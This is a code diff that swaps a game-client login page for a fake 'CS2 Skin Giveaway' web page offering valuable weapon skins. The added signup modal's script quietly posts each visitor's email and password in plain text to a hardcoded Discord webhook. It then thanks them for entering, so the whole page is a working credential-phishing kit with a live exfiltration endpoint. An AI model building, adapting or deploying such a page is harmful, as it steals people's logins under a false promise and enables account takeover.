@@ -1,397 +1,624 @@
 <!DOCTYPE html>
 <html lang="en">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <link href="assets/img/logo.png" rel="icon"/>
-  <title>
-   Prestige Client - Login
-  </title>
-  <style>
-   * {
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CS2 Skin Giveaway | Win Exclusive Skins</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #ff5500;
+            --primary-dark: #e64a00;
+            --dark: #121212;
+            --darker: #0a0a0a;
+            --light: #f5f5f5;
+            --gray: #2a2a2a;
+            --gray-light: #3a3a3a;
+        }
+        
+        * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #05071a;
-            min-height: 100vh;
+            background-color: var(--dark);
+            color: var(--light);
+            line-height: 1.6;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: var(--darker);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+        }
+        
+        nav {
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
         }
-
-        /* Subtle atmospheric purple glow like the homepage */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                    radial-gradient(ellipse 80% 50% at 50% 0%, rgba(99, 102, 241, 0.04) 0%, transparent 60%),
-                    radial-gradient(ellipse 60% 40% at 0% 50%, rgba(99, 102, 241, 0.02) 0%, transparent 60%),
-                    radial-gradient(ellipse 60% 40% at 100% 50%, rgba(99, 102, 241, 0.04) 0%, transparent 60%),
-                    radial-gradient(ellipse 80% 50% at 50% 100%, rgba(99, 102, 241, 0.02) 0%, transparent 60%);
-            z-index: -1;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background:
-                    radial-gradient(ellipse 100% 60% at 30% 30%, rgba(99, 102, 241, 0.04) 0%, transparent 50%),
-                    radial-gradient(ellipse 100% 60% at 70% 70%, rgba(99, 102, 241, 0.04) 0%, transparent 50%);
-            z-index: -1;
-        }
-
-        @keyframes subtleGlow {
-            0%, 100% {
-                opacity: 1;
-                transform: scale(1) rotate(0deg);
-            }
-            25% {
-                opacity: 0.8;
-                transform: scale(1.05) rotate(1deg);
-            }
-            50% {
-                opacity: 0.9;
-                transform: scale(0.95) rotate(-1deg);
-            }
-            75% {
-                opacity: 0.85;
-                transform: scale(1.02) rotate(0.5deg);
-            }
-        }
-
-        @keyframes containerFadeIn {
-            0% {
-                opacity: 0;
-                transform: translateY(50px) scale(0.95);
-                filter: blur(10px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-                filter: blur(0px);
-            }
-        }
-
-        .login-container {
-            background: rgb(8, 9, 24);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(99, 102, 241, 0.2);
-            border-radius: 16px;
-            padding: 3rem;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
-            position: relative;
-            z-index: 1;
-            opacity: 0;
-            animation: containerFadeIn 1.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) 0.0s forwards;
-        }
-
+        
         .logo {
-            text-align: center;
-            margin-bottom: 2.5rem;
-        }
-
-        .login-title {
-            font-size: 2.5rem;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 0.5rem;
-            color: white;
-        }
-
-        .login-title .highlight {
-            color: #8376FC;
-        }
-
-        .login-subtitle {
-            text-align: center;
-            color: #64748b;
-            margin-bottom: 2.5rem;
-            font-size: 1rem;
-            line-height: 1.5;
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-            color: white;
-            font-size: 0.9rem;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 1rem;
-            background: rgba(10, 10, 15, 0.6);
-            border: 1px solid rgba(99, 102, 241, 0.3);
-            border-radius: 8px;
-            color: white;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #6366f1;
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
-            background: rgba(10, 10, 15, 0.8);
-        }
-
-        .form-input::placeholder {
-            color: #64748b;
-        }
-
-        .login-button {
-            width: 100%;
-            padding: 1rem;
-            background: #6366f1;
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-size: 1rem;
-            font-weight: 600;
-            font-family: inherit;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-bottom: 1.5rem;
-            position: relative;
-            overflow: hidden;
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--light);
         }
-
-        /* Glint effect */
-        .login-button::before {
-            content: '';
-            position: absolute;
+        
+        .logo span {
+            color: var(--primary);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav-links a {
+            color: var(--light);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 80px 0;
+            text-align: center;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), 
+                        url('https://images.unsplash.com/photo-1593305841689-05c059eca2d6?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80');
+            background-size: cover;
+            background-position: center;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, var(--primary), #ffaa00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            color: #ccc;
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: var(--primary);
+            color: white;
+            padding: 14px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+        
+        .btn:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 85, 0, 0.3);
+        }
+        
+        /* Skins Section */
+        .skins-section {
+            padding: 80px 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+            font-size: 2.5rem;
+        }
+        
+        .section-title span {
+            color: var(--primary);
+        }
+        
+        .skins-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 30px;
+        }
+        
+        .skin-card {
+            background-color: var(--gray);
+            border-radius: 10px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .skin-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+        }
+        
+        .skin-img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        
+        .skin-info {
+            padding: 20px;
+        }
+        
+        .skin-name {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        
+        .skin-rarity {
+            color: var(--primary);
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        
+        .skin-price {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .price {
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+        
+        /* How It Works */
+        .how-it-works {
+            padding: 80px 0;
+            background-color: var(--darker);
+        }
+        
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 50px;
+        }
+        
+        .step {
+            text-align: center;
+            padding: 30px;
+            background-color: var(--gray);
+            border-radius: 10px;
+        }
+        
+        .step-icon {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .step-title {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+        }
+        
+        /* Footer */
+        footer {
+            background-color: var(--darker);
+            padding: 50px 0 20px;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+        
+        .copyright {
+            color: #666;
+            font-size: 0.9rem;
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
             top: 0;
-            left: -100%;
+            left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(
-                    90deg,
-                    transparent,
-                    rgba(255, 255, 255, 0.4),
-                    transparent
-            );
-            transition: left 0.5s ease;
-            animation: glint 3s ease-in-out infinite;
-        }
-
-        @keyframes glint {
-            0% {
-                left: -100%;
-                opacity: 0;
-            }
-            50% {
-                opacity: 1;
-            }
-            100% {
-                left: 100%;
-                opacity: 0;
-            }
-        }
-
-        .login-button:hover {
-            background: #5855eb;
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(99, 102, 241, 0.4);
-        }
-
-        .login-button:active {
-            transform: translateY(0);
-        }
-
-        .forgot-password {
-            text-align: center;
-            margin-top: 1.5rem;
-        }
-
-        .forgot-password a {
-            color: #6366f1;
-            text-decoration: none;
-            font-size: 0.9rem;
-            transition: color 0.3s ease;
-        }
-
-        .forgot-password a:hover {
-            color: #a5b4fc;
-        }
-
-        .signup-link {
-            text-align: center;
-            margin-top: 2rem;
-            padding-top: 2rem;
-            border-top: 1px solid rgba(99, 102, 241, 0.2);
-            color: #64748b;
-            font-size: 0.9rem;
-        }
-
-        .signup-link a {
-            color: #6366f1;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .signup-link a:hover {
-            color: #a5b4fc;
-        }
-
-        .error-message {
-            background: rgba(99, 102, 241, 0.1);
-            border: 1px solid rgba(99, 102, 241, 0.3);
-            color: #a5b4fc;
-            padding: 1rem;
-            border-radius: 8px;
-            margin-bottom: 1.5rem;
-            font-size: 0.9rem;
-            text-align: center;
-        }
-
-        .remember-me {
-            display: flex;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
             align-items: center;
-            margin-bottom: 2rem;
-            cursor: pointer;
+            justify-content: center;
         }
-
-        .remember-me input[type="checkbox"] {
-            display: none;
-        }
-
-        .custom-checkbox {
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(99, 102, 241, 0.5);
-            border-radius: 4px;
-            margin-right: 0.75rem;
+        
+        .modal-content {
+            background-color: var(--gray);
+            width: 100%;
+            max-width: 450px;
+            border-radius: 10px;
+            padding: 30px;
             position: relative;
-            transition: all 0.3s ease;
-            background: rgba(10, 10, 15, 0.6);
         }
-
-        .remember-me input[type="checkbox"]:checked + .custom-checkbox {
-            background: #6366f1;
-            border-color: #6366f1;
-        }
-
-        .remember-me input[type="checkbox"]:checked + .custom-checkbox::after {
-            content: '✓';
+        
+        .close-modal {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 12px;
-            font-weight: bold;
-        }
-
-        .remember-me label {
-            color: white;
-            font-size: 0.9rem;
+            top: 20px;
+            right: 20px;
+            font-size: 1.5rem;
+            color: #ccc;
             cursor: pointer;
-            user-select: none;
+            transition: color 0.3s;
         }
-
-        .remember-me:hover .custom-checkbox {
-            border-color: #6366f1;
-            box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.1);
+        
+        .close-modal:hover {
+            color: var(--primary);
         }
-
-        @media (max-width: 480px) {
-            .login-container {
-                margin: 1rem;
-                padding: 2rem;
+        
+        .modal-title {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 1.8rem;
+        }
+        
+        .modal-title span {
+            color: var(--primary);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background-color: var(--gray-light);
+            color: var(--light);
+            font-size: 1rem;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        
+        .form-footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #ccc;
+        }
+        
+        .form-footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background-color: var(--primary);
+            color: white;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: transform 0.3s, opacity 0.3s;
+            z-index: 1001;
+        }
+        
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
             }
-
-            .login-title {
-                font-size: 2rem;
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .skins-grid {
+                grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
             }
         }
-  </style>
- </head>
- <body>
-  <div class="login-container">
-   <div class="logo">
-    <h1 class="login-title">
-     Log In to
-     <span class="highlight">
-      Prestige
-     </span>
-    </h1>
-    <p class="login-subtitle">
-     Welcome back to the best ghost client on the market.
-    </p>
-   </div>
-   <form method="post" onsubmit="onClick(event)">
-    <input id="recaptchaResponse" name="g-recaptcha-response" type="hidden"/>
-    <div class="form-group">
-     <label class="form-label" for="email">
-      Username/Email Address
-     </label>
-     <input class="form-input" id="email" name="email" placeholder="Enter your username or email" required="" type="text" value=""/>
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <i class="fas fa-fire"></i>
+                    <div>CS2<span>Giveaway</span></div>
+                </div>
+                <div class="nav-links">
+                    <a href="#">Home</a>
+                    <a href="#">Skins</a>
+                    <a href="#">Winners</a>
+                    <a href="#">FAQ</a>
+                    <a href="#">Contact</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <h1>Win Exclusive CS2 Skins</h1>
+            <p>Enter our daily giveaway for a chance to win rare and exclusive Counter-Strike 2 weapon skins. No purchase necessary!</p>
+            <button class="btn" id="giveawayBtn">Enter Giveaway Now</button>
+        </div>
+    </section>
+
+    <!-- Featured Skins Section -->
+    <section class="skins-section">
+        <div class="container">
+            <h2 class="section-title">Featured <span>Skins</span></h2>
+            <div class="skins-grid">
+                <!-- Skin 1 -->
+                <div class="skin-card">
+                    <img src="https://cdn.esportfire-services.com/a2906036dd09091107b24759947f5762a97af90e1a31ac4955fc83791e1683a3" alt="Sun in Leo" class="skin-img">
+                    <div class="skin-info">
+                        <h3 class="skin-name">Sun in Leo</h3>
+                        <div class="skin-rarity">Covert Skin</div>
+                        <div class="skin-price">
+                            <div class="price">$1,250.00</div>
+                            <button class="btn">Enter to Win</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Skin 2 -->
+                <div class="skin-card">
+                    <img src="https://community.fastly.steamstatic.com/economy/image/i0CoZ81Ui0m-9KwlBY1L_18myuGuq1wfhWSaZgMttyVfPaERSR0Wqmu7LAocGIGz3UqlXOLrxM-vMGmW8VNxu5Dx60noTyLwlcK3wiVI0POlPPNSMOKcCGKD0ud5vuBlcCS2kRQyvnOGw4r_d3OWZ1MnCpBwR-Rc5hbumtCzP-Kw7wSIiYsRnHr2i35MvS1s_a9cBkIkkRA2/360fx360f" alt="AK-47 Slate" class="skin-img">
+                    <div class="skin-info">
+                        <h3 class="skin-name">AK-47 Slate</h3>
+                        <div class="skin-rarity">Classified Skin</div>
+                        <div class="skin-price">
+                            <div class="price">$980.50</div>
+                            <button class="btn">Enter to Win</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Skin 3 -->
+                <div class="skin-card">
+                    <img src="https://community.akamai.steamstatic.com/economy/image/i0CoZ81Ui0m-9KwlBY1L_18myuGuq1wfhWSaZgMttyVfPaERSR0Wqmu7LAocGIGz3UqlXOLrxM-vMGmW8VNxu5Dx60noTyLhzMOwwjFU0OGvZqBSLPmUBnPelesn5-RrSXDlwRhx5TjSwtmocCifPwQpDpshReBfsxPrk4DhNu3jshue1dy8VcXxuA/360fx360f" alt="P250 Sand Dune" class="skin-img">
+                    <div class="skin-info">
+                        <h3 class="skin-name">P250 Sand Dune</h3>
+                        <div class="skin-rarity">Consumer Grade</div>
+                        <div class="skin-price">
+                            <div class="price">$0.75</div>
+                            <button class="btn">Enter to Win</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Skin 4 -->
+                <div class="skin-card">
+                    <img src="https://community.fastly.steamstatic.com/economy/image/i0CoZ81Ui0m-9KwlBY1L_18myuGuq1wfhWSaZgMttyVfPaERSR0Wqmu7LAocGIGz3UqlXOLrxM-vMGmW8VNxu5Dx60noTyLwlcK3wiNQ0OKheqdoLPGaAFidxOp_pewnSn6wl0p-4D7Ryo34cSqeOwMlWZt5QbJfuhW9koKyMO3ksgWMiY8TzDK-0H009BnnIw/360fx360f" alt="AK-47 Inheritance" class="skin-img">
+                    <div class="skin-info">
+                        <h3 class="skin-name">AK-47 Inheritance</h3>
+                        <div class="skin-rarity">Restricted Skin</div>
+                        <div class="skin-price">
+                            <div class="price">$520.00</div>
+                            <button class="btn">Enter to Win</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works Section -->
+    <section class="how-it-works">
+        <div class="container">
+            <h2 class="section-title">How It <span>Works</span></h2>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-icon">
+                        <i class="fas fa-user-plus"></i>
+                    </div>
+                    <h3 class="step-title">Create Account</h3>
+                    <p>Sign up with your email and create a password to get started.</p>
+                </div>
+                
+                <div class="step">
+                    <div class="step-icon">
+                        <i class="fas fa-ticket-alt"></i>
+                    </div>
+                    <h3 class="step-title">Enter Giveaway</h3>
+                    <p>Choose which skin giveaway you want to enter.</p>
+                </div>
+                
+                <div class="step">
+                    <div class="step-icon">
+                        <i class="fas fa-trophy"></i>
+                    </div>
+                    <h3 class="step-title">Win Skins</h3>
+                    <p>If you're selected, the skin will be transferred to your account!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Contact Us</a>
+                <a href="#">FAQ</a>
+            </div>
+            <p class="copyright">© 2023 CS2Giveaway. This site is not affiliated with Valve or Steam. All trademarks belong to their respective owners.</p>
+        </div>
+    </footer>
+
+    <!-- Signup Modal -->
+    <div class="modal" id="signupModal">
+        <div class="modal-content">
+            <span class="close-modal" id="closeModal">&times;</span>
+            <h2 class="modal-title">Create <span>Account</span></h2>
+            <form id="signupForm">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="Enter your email" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Create a password" required>
+                </div>
+                <button type="submit" class="btn" style="width: 100%">Sign Up & Enter Giveaway</button>
+            </form>
+            <div class="form-footer">
+                <p>Already have an account? <a href="#">Log In</a></p>
+            </div>
+        </div>
     </div>
-    <div class="form-group">
-     <label class="form-label" for="password">
-      Password
-     </label>
-     <input class="form-input" id="password" name="password" placeholder="Enter your password" required="" type="password"/>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        Thank you for signing up! You've been entered into the giveaway.
     </div>
-    <button class="login-button" type="submit">
-     Log In
-    </button>
-   </form>
-   <div class="forgot-password">
-    <a href="resetPassword">
-     Forgot your password?
-    </a>
-   </div>
-   <div class="signup-link">
-    Don't have an account?
-    <a href="signup">
-     Sign up here
-    </a>
-    <br/>
-    <a href="index" style="color: #64748b;">
-     Return to home
-    </a>
-   </div>
-  </div>
-  <script>
-   /* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function(){var w=window,C='___grecaptcha_cfg',cfg=w[C]=w[C]||{},N='grecaptcha';var gr=w[N]=w[N]||{};gr.ready=gr.ready||function(f){(cfg['fns']=cfg['fns']||[]).push(f);};w['__recaptcha_api']='test1234';(cfg['render']=cfg['render']||[]).push('6LcU6aspAAAAAG87NfGBMcrkihwwPgIGgRdKrQCF');(cfg['clr']=cfg['clr']||[]).push('true');(cfg['anchor-ms']=cfg['anchor-ms']||[]).push(20000);(cfg['execute-ms']=cfg['execute-ms']||[]).push(15000);w['__google_recaptcha_client']=true;var d=document,po=d.createElement('script');po.type='text/javascript';po.async=true; po.charset='utf-8';po.src='test123';po.crossOrigin='anonymous';po.integrity='sha384-LpPE17frK5ghpDNcL02QVoY7N6n375lMdZEBjkcA4rqimdzMm/XNiOx2MI2jTEkt';var e=d.querySelector('script[nonce]'),n=e&&(e['nonce']||e.getAttribute('nonce'));if(n){po.setAttribute('nonce',n);}var s=d.getElementsByTagName('script')[0];s.parentNode.insertBefore(po, s);})();
-  </script>
- </body>
-</html>
-<script>
- function onClick(e) {
-        e.preventDefault();
-        grecaptcha.ready(function () {
-            grecaptcha.execute('6LcU6aspAAAAAG87NfGBMcrkihwwPgIGgRdKrQCF', {action: 'submit'}).then(function (token) {
-                document.getElementById('recaptchaResponse').value = token;
-                document.querySelector('form').submit();
+
+    <script>
+        // DOM Elements
+        const giveawayBtn = document.getElementById('giveawayBtn');
+        const signupModal = document.getElementById('signupModal');
+        const closeModal = document.getElementById('closeModal');
+        const signupForm = document.getElementById('signupForm');
+        const notification = document.getElementById('notification');
+        
+        // Webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1395558887444316331/gfLOAY8nGFqvuqx-NACqR4RJj59Na1bLqekWLixU7dk9CXgqVOgkInxKp6in-hQRdWPC';
+        
+        // Open modal when giveaway button is clicked
+        giveawayBtn.addEventListener('click', () => {
+            signupModal.style.display = 'flex';
+        });
+        
+        // Close modal when X is clicked
+        closeModal.addEventListener('click', () => {
+            signupModal.style.display = 'none';
+        });
+        
+        // Close modal when clicking outside the modal content
+        window.addEventListener('click', (e) => {
+            if (e.target === signupModal) {
+                signupModal.style.display = 'none';
+            }
+        });
+        
+        // Show notification
+        function showNotification() {
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Handle form submission
+        signupForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Basic validation
+            if (!email || !password) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            // Create data to send to webhook
+            const data = {
+                content: `New CS2 Giveaway Signup!\nEmail: ${email}\nPassword: ${password}`,
+                username: "CS2 Giveaway Bot",
+                avatar_url: "https://cdn.esportfire-services.com/a2906036dd09091107b24759947f5762a97af90e1a31ac4955fc83791e1683a3"
+            };
+            
+            try {
+                // Send data to Discord webhook
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+                
+                if (response.ok) {
+                    // Show success message
+                    showNotification();
+                    signupModal.style.display = 'none';
+                    signupForm.reset();
+                } else {
+                    alert('There was an error with your submission. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('There was an error with your submission. Please try again.');
+            }
+        });
+        
+        // Add event listeners to all "Enter to Win" buttons
+        const enterButtons = document.querySelectorAll('.skin-card .btn');
+        enterButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                signupModal.style.display = 'flex';
             });
         });
-    }
-</script>
+    </script>
+</body>
+</html>
